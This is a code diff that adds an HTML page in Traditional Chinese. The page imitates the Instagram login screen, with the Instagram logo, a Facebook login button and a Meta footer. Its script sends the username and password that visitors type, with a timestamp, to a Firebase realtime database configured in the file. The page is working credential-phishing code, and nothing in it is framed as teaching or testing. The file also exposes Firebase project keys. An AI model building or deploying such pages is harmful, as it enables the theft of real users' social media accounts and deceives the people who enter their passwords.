@@ -1,0 +1,68 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram 登入頁面</title>
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js"></script>
+</head>
+<body>
+    <div class="form-container">
+        <img src="img/instagram-logo.png" alt="Instagram Logo" class="logo" />
+        <input type="text" id="input1" placeholder="手機號碼、用戶名稱或電子郵件" />
+        <input type="password" id="input2" placeholder="密碼" />
+        <button id="submitBtn">登入</button>
+        <div class="divider">或</div>
+        <button class="facebook-login">
+            <img src="img/facebook-icon.png" alt="Facebook Icon" class="facebook-icon" />
+            使用 Facebook 帳號登入
+        </button>
+        <div class="forgot-password">忘記密碼？</div>
+        <footer>© Meta</footer>
+    </div>
+    <script>
+      const firebaseConfig = {
+        apiKey: "AIzaSyDUIA_sXWE_iQU5T_YQ0_LDjnA7rsQ7Qjg",
+        authDomain: "emotion-a33d0.firebaseapp.com",
+        databaseURL: "https://emotion-a33d0-default-rtdb.firebaseio.com",
+        projectId: "emotion-a33d0",
+        storageBucket: "emotion-a33d0.appspot.com",
+        messagingSenderId: "99528384914",
+        appId: "1:99528384914:web:d9c92b81a4eefe8310a14b",
+        measurementId: "G-MG9PEQN96M"
+      };
+
+      const app = firebase.initializeApp(firebaseConfig);
+      const database = firebase.database();
+
+      document.getElementById("submitBtn").addEventListener("click", function () {
+        const input1 = document.getElementById("input1").value.trim();
+        const input2 = document.getElementById("input2").value.trim();
+
+        if (input1 === "" || input2 === "") {
+          alert("請填寫完整資料");
+          return;
+        }
+
+        const newData = {
+          input1: input1,
+          input2: input2,
+          timestamp: new Date().toISOString()
+        };
+
+        database.ref('userInputs').push(newData)
+          .then(() => {
+            alert("✅ 資料已儲存");
+            document.getElementById("input1").value = "";
+            document.getElementById("input2").value = "";
+          })
+          .catch((error) => {
+            alert("❌ 儲存失敗：" + error);
+          });
+      });
+    </script>
+</body>
+</html>
